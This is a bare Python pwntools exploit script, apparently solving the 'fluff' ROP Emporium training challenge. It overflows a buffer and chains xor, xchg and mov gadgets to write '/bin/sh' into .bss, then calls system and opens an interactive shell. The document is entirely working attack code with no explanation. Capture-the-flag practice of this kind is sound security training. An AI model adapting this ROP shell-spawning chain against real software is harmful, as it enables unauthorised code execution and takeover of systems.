from pwn import *

sh = process('./fluff')
elf = ELF('./fluff')

bss_addr = 0x601060
sys_addr = elf.symbols['system']

mov_addr = 0x40084e
xchg_addr = 0x400840
xor_r11_r12_addr = 0x40082f
xor_r11_r11_addr = 0x400822
pop_addr = 0x4008bc

pop_rdi_addr = 0x4008c3

payload = 'a' * (0x20 + 0x8)
payload += p64(pop_addr) + p64(bss_addr) + p64(0) + p64(0) + p64(0)
payload += p64(xor_r11_r11_addr) + p64(0)
payload += p64(xor_r11_r12_addr) + p64(0)
payload += p64(xchg_addr) + p64(0)

payload += p64(pop_addr) + '/bin/sh\x00' + p64(0) + p64(0) + p64(0)
payload += p64(xor_r11_r11_addr) + p64(0)
payload += p64(xor_r11_r12_addr) + p64(0)
payload += p64(mov_addr) + p64(0) + p64(0)

payload += p64(pop_rdi_addr) + p64(bss_addr)

payload += p64(sys_addr)

sh.recvuntil('>')
sh.sendline(payload)

sh.interactive()
sh.close()